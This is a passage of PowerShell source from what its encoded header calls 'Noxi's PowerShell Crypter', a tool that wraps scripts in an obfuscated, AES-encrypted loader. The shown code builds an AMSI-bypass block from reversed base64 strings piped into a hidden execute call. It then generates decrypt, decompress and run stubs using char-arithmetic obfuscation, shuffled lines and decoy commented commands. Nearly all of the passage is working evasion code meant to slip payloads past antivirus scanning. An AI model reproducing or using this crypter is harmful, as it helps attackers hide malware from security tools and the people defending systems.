            [byte[]] $fullData = $nvaesm.IV + $encryptedat
            $nvaesm.dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)
            #$confusestart = "#lnvoke-expression $(confusekey)"  + "`r`n"
            $confusestart = "$(linefuse)"  + "`r`n"
            $timestamp = Get-Date -Format "yyyy-MM-dd"
            $metadatalines = @(
                ""
                ([sYsTeM.TEXt.eNcOding]::utf8.getSTRinG((35, 32, 32, 32, 32, 78, 111, 120, 105, 39, 115, 32, 80, 111, 119)) + [SYSTeM.teXT.eNcoDInG]::uTF8.gEtStRinG((0x65, 0x72, 0x53, 0x68, 0x65, 0x6c, 0x6c, 0x20, 0x43, 0x72, 0x79, 0x70, 0x74, 0x65, 0x72)))
                ([sysTem.TEXt.ENCodiNg]::uTf8.gETStrIng((35, 32, 32, 32, 32, 67, 111, 112, 121, 114, 105, 103, 104, 116, 32, 40, 67, 41, 32, 50, 48, 50, 52)) + [sysTEm.TeXt.ENcOdiNG]::utF8.GETStRiNG([SySTEM.coNVeRT]::fRoMbAse64striNG('IE5vdmVyc2Ug')))
                "#"
                ([SySTEM.TeXt.enCODiNg]::UTf8.getSTrIng((35, 32, 0x20, 0x20, 32, 84, 104, 105, 115, 0x20, 0x63, 111, 0x64, 0x65, 0x20, 0x77, 97, 115, 32, 101, 110, 0x63, 0x72, 121, 112, 116, 101, 0x64, 32, 119, 105, 116, 0x68, 0x20, 78, 0x6f, 0x78, 105, 39)) + [sYstEM.TEXT.EncOdiNG]::utf8.gETsTRing([SyStEm.CoNVerT]::FROmBase64sTRInG('cyBQb3dlclNoZWxsIENyeXB0ZXI=')))
                ([systEm.TeXt.eNCoding]::UtF8.GEtStRInG((35, 32, 32, 32, 32, 77, 111, 114, 101, 32, 105, 110, 102, 111, 32, 111, 110, 58, 32, 104, 116, 116, 112, 115)) + [SySTem.TeXt.ENcoDINg]::utF8.GETSTRinG((58, 0x2f, 47, 100, 105, 115, 99, 111, 114, 0x64, 0x2e, 103, 103, 47, 0x45, 50, 0x79, 98, 71, 52, 0x6a, 57, 0x6a)) + [sysTEM.teXt.EnCODIng]::UTf8.geTsTRING(85))
                "#"
                "#    Created on: $timestamp",
                "#    Identifier: Noxi-$(.([char](((-23257 -Band 7253) + (-23257 -Bor 7253) + 6420 + 9694))+[char]((12156 - 5980 - 2013 - 4045))+[char]((6889 - 4086 + 2803 - 5492))+[char](((-2505 -Band 2287) + (-2505 -Bor 2287) + 1916 - 1601))+[char]((12488 - 8371 - 7771 + 3764))+[char](((-3626 -Band 4320) + (-3626 -Bor 4320) + 8765 - 9359))+[char]((459 - 2901 + 8246 - 5693))+[char]((16424 - 9236 - 7248 + 169))))",
                "#    Integrity-Key: $(.([char]((6991 - 4514 - 7653 + 5286))+[char]((6675 - 9172 + 9416 - 6801))+[char]((12179 - 9352 + 4082 - 6795))+[char]((-2508 - 9599 + 3222 + 8982))+[char]((-3816 - 1351 - 1899 + 7176))+[char](((-2328 -Band 5188) + (-2328 -Bor 5188) + 201 - 2961))+[char]((7030 - 7992 + 4696 - 3623))+[char](((7562 -Band 1845) + (7562 -Bor 1845) - 791 - 8507))))$(.([char](((-24465 -Band 8688) + (-24465 -Bor 8688) + 8506 + 7381))+[char](((-7089 -Band 4814) + (-7089 -Bor 4814) - 852 + 3245))+[char](((-2259 -Band 9622) + (-2259 -Bor 9622) - 9467 + 2218))+[char]((-768 - 5115 - 2539 + 8519))+[char](((-9106 -Band 6604) + (-9106 -Bor 6604) - 4458 + 7070))+[char]((-8121 - 7901 + 7972 + 8150))+[char](((-48 -Band 1043) + (-48 -Bor 1043) - 2642 + 1758))+[char]((4238 - 7789 + 9890 - 6230))))",
                "#    Security-Key: $(.([char]((6249 - 8154 - 5135 + 7150))+[char](((-5146 -Band 5988) + (-5146 -Bor 5988) - 9490 + 8766))+[char](((494 -Band 7442) + (494 -Bor 7442) + 55 - 7877))+[char]((19443 - 352 - 9893 - 9101))+[char](((8812 -Band 479) + (8812 -Bor 479) - 4626 - 4555))+[char]((21388 - 9794 - 6992 - 4502))+[char](((-6549 -Band 5066) + (-6549 -Bor 5066) + 7295 - 5701))+[char]((20766 - 5143 - 6252 - 9262))))$(.([char]((16446 - 8793 - 2134 - 5409))+[char](((3738 -Band 5069) + (3738 -Bor 5069) - 9077 + 388))+[char]((3377 - 9943 - 3005 + 9685))+[char](((-4994 -Band 7543) + (-4994 -Bor 7543) - 8199 + 5747))+[char]((13691 - 2549 - 8869 - 2163))+[char](((-4553 -Band 7233) + (-4553 -Bor 7233) - 1523 - 1057))+[char](((-1881 -Band 2443) + (-1881 -Bor 2443) - 3669 + 3218))+[char](((11438 -Band 2653) + (11438 -Bor 2653) - 5645 - 8337))))",
                ([syStem.teXT.eNCOdiNG]::utf8.GETSTriNg((0x23, 32, 32, 0x20, 32, 0x44, 0x65, 0x63, 114, 121, 0x70, 116, 105, 0x6f, 0x6e, 45, 0x4b)) + [SYStEm.tExT.ENcoDIng]::utf8.getSTRing([SysTem.cONvERT]::FroMbASe64stRINg('ZXk6IDFuMDVvMTN2MjA1ZTY2cnN3ZQ=='))),
                "#"
                "#$(linefuse)"
                #"#lnvoke-restmethod -uri $(confusekey)"
            )
            $metadata = ($metadataLines -join "`n") + "`n"
            $amsipre  = @()
            $amsipre += '$noxam1i05over13sebyp4 = "=kSflVFYSR1ekACL9xEbVBmT7RCKlVHbhZFdlNlL9RGTFlEYGtHJK0QKpkyJ1dCLpkyJjdCLpcSasdyKnI2JoYWLi0XM71HM7JCKscCIsciZtISfwsXfxsnIoYWLgISfwsXfxsnIowyJOdCLpcCUnsyJu92JowyJjdCLpkyJhR3JrcyUngCLnkGdnAiZtAiI9Bze9FzeigiZtAiI9Fze9Bze9Rze9Jze9NzeigCIs0Xaz1GYBtHJoQGbllmR0V2Ru0XZwlFY0tHJg0DI9RGbgVUSmtHJK0QK9N3UgFEYQlnQ7RCKlBXeURXZH5SfZxEYC1WZzNVQ7RCI9ASfFBFY5R1ekoQD5xmYtV2czFkLdZWZStFI9ASfZxkQg1WRzB2UhtHJK0QKpQjN4BDL1YDewwyY2gHMskjN4BDLxYDewwiN0gHMsQzN4BDL5YDewwSZ2gHMskDN4BDL5YDewwyM3gHMsQmN4BDLxYDewgCKn5WayR3U0V2RugjRUVlO601ZulGZvNmbF5Cd4VGVbBSPg0XazBWbhtHJK0QKp0HIpkiNxACLlVHbhZlL991ekgiMzQnbJV1bUpjOdRnclZnbvN2Wo0lchh2YbByegQ3YlpmYP1CajFWRy9mRgwHIpciLucCIskyJ3cCLpcSMnwyJ3cCLpciZnwSKnYzJskyJ5cyKnYDNngiZtAiI9Fze9BzeigiZtAiI9Fze9BzeigiZtAiI9Bze9Fze9JzeigCLpkyJxcyKnYDZngCLnUmNnAiZtISfwsXfxsnIowSKnU2JskyJkdyKnYjZngCLpcyN1cCLnYDNnAiZtISfwsXfxsnIowSKnczJrcSM0cCKgYWLgISfysXfxsXfwsXfzsnIowyJ2MzJsciMkdCLnQTZnwSKpkSKnYzJrcCZ2cCKscSNnYWLi0XM71HM7JCKsciN3cCIm1CIi0XM71HM7JCKscSNnwSKnU2JskyJycyKnQzNngiZtISfwsXfxsnIowyJ2cCIm1iI9Fze9Bze9Jze9NzeigCLpcSNnsyJ1kzJowSKpcCN3cCLpcyMnsyJ3kzJowyJ1YzJm1CIi0HM71nM71XM7JCKsciNnwyJ1cCLnczMnYWLi0nM713M71HM71XM7JCKsciNnwSKnYzJrcSM2cCKscSZnwSKpciN0cyKnczJowSKnMmNnwyJzczJgYWLi0HM71XM7JCKscSOnYWLgISfxsXfwsXfysnIowyJ2cCLpcCZ2cCLnEDNnAiZtISfxsXfwsnIowyJyU2Jm1CIi03M71HO71nMxsXf2Eze9Fze9Rze9Bze9Jze9VTM71nN713MxsXf5sXf1sXf0Eze9BTM71XMxsXf3snIogyclh2Y0FWT6oTX4V2ZlJ3WoAibp9matgCI9ASfzNXQgBVeitHJ"' + "`r`n"
            $amsipre += (linefuse) + "`r`n"
            $amsipre += '$noxam1i05over16sebyp4 = $noxam1i05over13sebyp4.([char](((-3861 -Band 5948) + (-3861 -Bor 5948) - 1416 - 587))+[char](((5006 -Band 2257) + (5006 -Bor 2257) - 2375 - 4809))+[char](((-11793 -Band 9791) + (-11793 -Bor 9791) + 8018 - 5949))+[char]((-3577 - 1544 + 3447 + 1746))+[char]((24402 - 8825 - 8461 - 7051))+[char](((449 -Band 9727) + (449 -Bor 9727) - 1663 - 8431))+[char](((-447 -Band 4481) + (-447 -Bor 4481) - 9057 + 5088))+[char](((4143 -Band 1263) + (4143 -Bor 1263) - 5788 + 464))+[char](((-17356 -Band 2309) + (-17356 -Bor 2309) + 9550 + 5579))+[char](((-14704 -Band 6057) + (-14704 -Bor 6057) - 10 + 8722))+[char](((-444 -Band 1537) + (-444 -Bor 1537) - 3786 + 2782)))()' + "`r`n"
            $amsipre += (linefuse) + "`r`n"
            $amsipre += '[aRrAy]::([char](((-11488 -Band 8075) + (-11488 -Bor 8075) + 4677 - 1150))+[char](((-15152 -Band 6518) + (-15152 -Bor 6518) + 2122 + 6581))+[char](((-11286 -Band 1595) + (-11286 -Bor 1595) + 5434 + 4343))+[char](((-2890 -Band 6520) + (-2890 -Bor 6520) - 8922 + 5361))+[char](((10959 -Band 5225) + (10959 -Bor 5225) - 6271 - 9831))+[char](((-22 -Band 9824) + (-22 -Bor 9824) - 4697 - 5022))+[char](((-4382 -Band 2293) + (-4382 -Bor 2293) - 4253 + 6411)))($noxam1i05over16sebyp4)' + "`r`n"
            $amsipre += (linefuse) + "`r`n"
            $amsipre += '$noxam1i05over19sebyp4 = -jOiN($noxam1i05over16sebyp4)' + "`r`n"
            $amsipre += (linefuse) + "`r`n"
            $amsipre += '([sYsTem.TeXt.EnCoDiNg]::([char](((-15212 -Band 4405) + (-15212 -Bor 4405) + 3213 + 7679))+[char](((-1237 -Band 5295) + (-1237 -Bor 5295) - 8168 + 4226))+[char](((3833 -Band 616) + (3833 -Bor 616) + 1393 - 5772))+[char](((-1442 -Band 9351) + (-1442 -Bor 9351) - 9352 + 1499))).([char](((7110 -Band 7192) + (7110 -Bor 7192) - 5727 - 8472))+[char]((10706 - 9987 + 8213 - 8863))+[char](((-4315 -Band 7498) + (-4315 -Bor 7498) - 6202 + 3135))+[char]((6133 - 5229 + 1745 - 2534))+[char](((-3163 -Band 6736) + (-3163 -Bor 6736) - 4042 + 585))+[char](((-16888 -Band 8584) + (-16888 -Bor 8584) + 3277 + 5109))+[char](((9080 -Band 2927) + (9080 -Bor 2927) - 4791 - 7143))+[char](((15613 -Band 684) + (15613 -Bor 684) - 8868 - 7319))+[char](((6411 -Band 2324) + (6411 -Bor 2324) - 9338 + 674)))([SySTem.CoNvErT]::([char](((55 -Band 6708) + (55 -Bor 6708) + 1326 - 8019))+[char]((-3766 - 6100 + 9349 + 599))+[char](((-4234 -Band 3291) + (-4234 -Bor 3291) - 8845 + 9867))+[char](((-8050 -Band 6192) + (-8050 -Bor 6192) + 4340 - 2405))+[char](((-14861 -Band 7409) + (-14861 -Bor 7409) - 271 + 7789))+[char]((5715 - 8922 + 1287 + 1985))+[char](((6544 -Band 7874) + (6544 -Bor 7874) - 6162 - 8173))+[char](((-1209 -Band 6187) + (-1209 -Bor 6187) - 276 - 4633))+[char]((2515 - 3825 - 6060 + 7424))+[char](((5333 -Band 1018) + (5333 -Bor 1018) - 7498 + 1199))+[char](((-8337 -Band 4462) + (-8337 -Bor 4462) + 188 + 3770))+[char]((-300 - 411 - 1962 + 2757))+[char](((-9604 -Band 4993) + (-9604 -Bor 4993) + 6600 - 1907))+[char](((-11046 -Band 2272) + (-11046 -Bor 2272) + 9314 - 435))+[char](((967 -Band 8319) + (967 -Bor 8319) - 7360 - 1816))+[char](((3041 -Band 1800) + (3041 -Bor 1800) - 9458 + 4720)))("$noxam1i05over19sebyp4")))|&([char]((2523 - 2614 - 4746 + 4910))+[char](((-11723 -Band 2744) + (-11723 -Bor 2744) + 5845 + 3212))+[char]((11829 - 7353 + 2004 - 6394))+[char](((-14684 -Band 1130) + (-14684 -Bor 1130) + 5795 + 7838))+[char](((7790 -Band 1401) + (7790 -Bor 1401) - 5316 - 3800))+[char](((-7002 -Band 6060) + (-7002 -Bor 6060) + 3195 - 2184))+[char](((-14009 -Band 471) + (-14009 -Bor 471) + 4103 + 9480))+[char](((-13817 -Band 3144) + (-13817 -Bor 3144) + 4911 + 5831))+[char](((-16107 -Band 2812) + (-16107 -Bor 2812) + 8813 + 4570))+[char](((-4302 -Band 1864) + (-4302 -Bor 1864) + 3535 - 1017))+[char]((10571 - 7774 - 7320 + 4605))+[char]((10896 - 84 - 4290 - 6453))+[char](((-5952 -Band 7714) + (-5952 -Bor 7714) - 556 - 1123))+[char]((6883 - 4942 + 6048 - 7906))+[char](((6261 -Band 7411) + (6261 -Bor 7411) - 9728 - 3871))+[char](((-16021 -Band 9058) + (-16021 -Bor 9058) + 5225 + 1817))+[char](((-9394 -Band 3249) + (-9394 -Bor 3249) + 5744 + 479)))' + "`r`n"
            $amsi = $amsipre -join ''
            $nvstubpre = ''
            $nvcodealtna  = @()
            $nvcodealtna += '${2} = [SySTem.cOnvert]::{149}("{0}")' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${3} = [SySTeM.CoNVerT]::{150}("{1}")' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${30} = "EV0Rh5UQNNXZB5SWIBXQSd2b0BXWyNkL5RVSSV1YlNlLtVEVzl1c"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${31} = ${30}.{82}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '[ArRaY]::{66}(${31})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${32} = -jOiN(${31})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${33} = [SYsTEm.TExT.EncODiNG]::{98}.{116}([sYstem.CoNVErt]::{151}(${32}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4} = {175} "${33}"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna_shuffled = $nvcodealtna 
            $nvstubpre += $nvcodealtna_shuffled -join ''
            #$nvstubpre += '#lnvoke-webrequest -uri {10}' + "`r`n"

            $nvcodealtna  = @()
            $nvcodealtna += '${16} = "==wYCNmO60VZE9UTyVGSwl0YukHaQFmcH9Gdwlncj5Se0lkUVNURz5STFR1c5N3W"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${17} = ${16}.{83}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '[aRrAy]::{67}(${17})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${18} = -JOiN(${17})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${19} = [sYStEm.TEXt.eNcODInG]::{99}.{117}([sYStEm.cOnVerT]::{152}(${18}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${20} = & ([SCRiPtbLock]::{133}(${19}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4}.{174} = ${20}' + " #$(linefuse)" + "`r`n"
            #$nvcodealtna += '${4}.ModE = [systen.security.cryptography.ciphermode]::'+$ciphermode + " #$(linefuse)" + "`r`n"
            #$nvstubpre += '#start-job {64}' + "`r`n"
            
            if ($paddingmode -eq 'PKCS7') {
                $nvcodealtna += '${21} = "==wNzN0SwpjOdVEZv10RulEZEFGcukHawFmcn9EVQllcj5SeUlmcVNWZz5STFR1UZN3W"' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${22} = ${21}.{84}()' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '[aRRaY]::{68}(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${23} = -joIN(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${24} = [SYsTEm.TeXT.EncOdInG]::{100}.{118}([SyStem.COnvERt]::{153}(${23}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${25} = & ([ScRiptblocK]::{134}(${24}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${4}.{168} = ${25}' + " #$(linefuse)" + "`r`n"
            } elseif ($paddingmode -eq 'ISO10126') {
                $nvcodealtna += '${21} = "==gNyEDMx80cppjOdVGRv10ROlEREFEcukFSQFkUn9EdQllUD5SW0lmU1NWRT5SblR3cZN1W"' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${22} = ${21}.{85}()' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '[ArRaY]::{69}(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${23} = -JoIN(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${24} = [sySTEm.Text.EncodinG]::{101}.{119}([SySTem.CoNVeRT]::{154}(${23}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${25} = & ([scriptblock]::{135}(${24}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${4}.{169} = ${25}' + " #$(linefuse)" + "`r`n"
            } elseif ($paddingmode -eq 'ANSIX923') {
                $nvcodealtna += '${21} = "==wMykDepNnThpjOdVGRP10ZulEREFEUukFawFmUn9GVwlnUD5SWUlmUVNWRT5STlR3U5N3W"' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${22} = ${21}.{86}()' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '[aRRAY]::{70}(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${23} = -JOIn(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${24} = [SySteM.Text.ENcODInG]::{102}.{120}([SYstEM.cOnVERt]::{155}(${23}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${25} = & ([sCrIPTBLoCK]::{136}(${24}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${4}.{170} = ${25}' + " #$(linefuse)" + "`r`n"
            } elseif ($paddingmode -eq 'Zeros') {
                $nvcodealtna += '${21} = "==wcvJVZapjOdVGZP10ZulGZEFEcukFaQFmcH9GdwlnUj5SW0lmc1NWZT5STlR3UZN1W"' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${22} = ${21}.{87}()' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '[ArRay]::{71}(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${23} = -JoIn(${22})' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${24} = [sYSTem.tExT.EnCODiNG]::{103}.{121}([sYsTEm.convErT]::{156}(${23}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${25} = & ([ScrIptbloCK]::{137}(${24}))' + " #$(linefuse)" + "`r`n"
                $nvcodealtna += '${4}.{171} = ${25}' + " #$(linefuse)" + "`r`n"
            }
            $nvstubpre += $nvcodealtna -join ''
            #$nvstubpre += '#lnvoke-expression {63}' + "`r`n"
            #$nvcodealtna += '${4}.pAddINg = [systen.security.cryptography.paddingmode]::'+$paddingmode + " #$(linefuse)" + "`r`n"
            
            $nvcodealtna = @()
            $nvcodealtna += '${60} = ((10+50-20*2)+(4)-20/20+105)' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4}.{172} = ${60}' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${61} = ((10+166-20*2)+(97)+(12+11))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4}.{142} = ${61}' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4}.{141} = ${3}' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${62} = ${2}[0..15]' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4}.{143} = ${62}' + " #$(linefuse)" + "`r`n"            
            $nvstubpre += $nvcodealtna -join ''
            #$nvstubpre += '#[convert]::frombase64string({11}' + "`r`n"
            
            $nvcodealtna  = @()
            $nvcodealtna += '${51} = "==QbhVmUUNXeS9WTl1kLPlmLNVGdTl1c"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${52} = ${51}.{88}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '[ArRAY]::{72}(${52})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${53} = -Join(${52})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${54} = [syStEM.tEXT.encoDinG]::{104}.{122}([syStem.cONVert]::{157}("${53}"))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${6} = {176} ${54}(,${4}.{148}().{173}(${2},16,${2}.LeNgTh-16))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${7} = {177} ${54}' + " #$(linefuse)" + "`r`n"
            $nvstubpre += $nvcodealtna -join ''
            #$nvstubpre += '#instalI-module {12}' + "`r`n"
            
            $nvcodealtna = @()
            if ($compressiontype -eq "Gzip") {
                $nvstubpre += '${51} = "=0WQFJHVTBXa6dkLu9UazNXZyBXbvNmLPlmLtVEVzl1U"' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${52} = ${51}.{89}()' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '[ARraY]::{73}(${52})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${53} = -jOIn(${52})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${29} = [SySteM.texT.encoDING]::{105}.{123}([sysTeM.cONvERT]::{158}("${53}"))' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${54} = "=0VRk9UbO9WazNVRSBVTvNmLu9USzNVZyBVbvNmLvl2W"' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${55} = ${54}.{90}()' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '[aRRay]::{74}(${55})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${56} = -JoiN(${55})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${28} = & ([ScrIPtBLOcK]::{138}([sYStem.tEXt.enCoDING]::{106}.{124}([SYSteM.conVERT]::{159}("${56}"))))' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${57} = "==wcTVkcw12bDVEZ"' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${58} = ${57}.{91}()' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '[ArRay]::{75}(${58})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${59} = -joiN(${58})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${27} = [SYstEm.Text.EnCOding]::{107}.{125}([SYSTEM.COnverT]::{160}("${59}"))' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${5} = {178} ${29} ${6}, (${28}::${27})' + " #$(linefuse)" + "`r`n"
                #$nvstubpre += '${5} = &(GCM *w-o*t) systen.io.compression.gzipstream ${6}, ([io.compression.compressionmode]::decompress)' + " #$(linefuse)" + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $nvstubpre += '${51} = "=0WYlJHVzVEVBxkRFRkLO9USTNXZyBVbvNmLPlmLNVEVzl1c"' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${52} = ${51}.{92}()' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '[ARRay]::{76}(${52})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${53} = -JOiN(${52})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${29} = [SysTEm.tEXt.EnCodINg]::{109}.{126}([sysTem.CoNVErt]::{161}("${53}"))' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${54} = "=0VRk9UbO9WazNVRSBVTvNmLu9USzNVZyBVbvNmLvl2W"' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${55} = ${54}.{93}()' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '[ArRaY]::{77}(${55})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${56} = -JoIn(${55})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${28} = & ([ScRIPtBlOcK]::{139}([sysTEm.Text.EncOdiNG]::{110}.{127}([SYSTEm.conVerT]::{162}("${56}"))))' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${57} = "==wcTVkcw12bDVEZ"' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${58} = ${57}.{94}()' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '[arrAy]::{78}(${58})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${59} = -joIN(${58})' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${27} = [SYStEM.teXT.ENcODinG]::{111}.{128}([SYSTEM.cOnVErT]::{163}("${59}"))' + " #$(linefuse)" + "`r`n"
                $nvstubpre += '${5} = {179} ${29} ${6}, (${28}::${27})' + " #$(linefuse)" + "`r`n"
                #$nvstubpre += '${5} = &(GCM *w-o*t) systen.io.compression.deflatestream ${6}, ([io.compression.compressionmode]::decompress)' + " #$(linefuse)" + "`r`n"
            }
            $nvstubpre += '${5}.{144}(${7})' + " #$(linefuse)" + "`r`n"
            #$nvstubpre += '#set-variabIe {13}' + "`r`n"
            $nvstubpre += $nvcodealtna -join ''
            
            $nvcodealtna  = @()
            $nvcodealtna += '${5}.{145}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${4}.{147}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${6}.{146}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna_shuffled = $nvcodealtna | Sort-Object {Get-random}
            $nvstubpre += $nvcodealtna_shuffled -join ''
            #$nvstubpre += '#get-Iocation {65}' + "`r`n"

            $nvcodealtna  = @()
            $nvcodealtna += '${34} = "W1RlWFQuRW5DT2RJbkdd"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${35} = [sYStEm.teXt.EncODING]::{112}.{129}([SyStem.CoNvert]::{164}(${34}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${36} = & ([ScRIpTblock]::{140}(${35}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${39} = "==COGRXV"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${40} = ${39}.{95}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '[ARraY]::{79}(${40})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${41} = -JOIn(${40})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${42} = [SYstEm.tEXT.eNCoDIng]::{113}.{130}([sysTEm.ConVErT]::{165}(${41}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${43} = "n5WayR3U0V2R"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${44} = ${43}.{96}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '[arRAy]::{80}(${44})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${45} = -joiN(${44})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${46} = [sysTEm.TeXT.ENcOdinG]::{114}.{131}([SYstEM.COnveRt]::{166}(${45}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${47} = "==QWBJlUB9Ed"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${48} = ${47}.{97}()' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '[ARRAy]::{81}(${48})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${49} = -jOIN(${48})' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${50} = [SYSTEm.TeXT.ENCODing]::{115}.{132}([sySTem.cOnverT]::{167}(${49}))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${8} = ${36}::${42}.${46}(${7}.${50}())' + " #$(linefuse)" + "`r`n"
            #$nvcodealtna += '${8} = [text.encoding]::utf8.getstring(${7}.toarray())' + " #$(linefuse)" + "`r`n"
            $nvstubpre += $nvcodealtna -join ''
            #$nvstubpre += '#start-process {14}' + "`r`n"

            $nvstubpre += (
                '& ([char]((5591 - 1917 - 703 - 2866))+[char](((-76 -Band 1357) + (-76 -Bor 1357) + 7835 - 9015))+[char](((11229 -Band 1042) + (11229 -Bor 1042) - 3467 - 8684)))',
                '& ([char](((-14316 -Band 6651) + (-14316 -Bor 6651) + 5280 + 2458))+[char](((13444 -Band 539) + (13444 -Bor 539) - 4849 - 9033))+[char](((-6259 -Band 6079) + (-6259 -Bor 6079) - 7830 + 8098)))',
                '& ([char](((-20558 -Band 9226) + (-20558 -Bor 9226) + 4827 + 6578))+[char](((126 -Band 3024) + (126 -Bor 3024) - 7285 + 4204))+[char]((10888 - 3219 + 2090 - 9671)))',
                '& ([char](((-5126 -Band 2412) + (-5126 -Bor 2412) + 3410 - 591))+[char](((-8020 -Band 5005) + (-8020 -Bor 5005) + 7612 - 4528))+[char](((-16272 -Band 927) + (-16272 -Bor 927) + 8219 + 7246)))',
                '& ([char]((4976 - 6909 - 4175 + 6213))+[char]((-4135 - 7484 + 1945 + 9743))+[char](((1942 -Band 6467) + (1942 -Bor 6467) - 5314 - 3007)))',
                '& ([char](((7426 -Band 1006) + (7426 -Bor 1006) - 8700 + 341))+[char]((16397 - 5218 - 4807 - 6271))+[char]((-3752 - 8349 + 8988 + 3201)))',
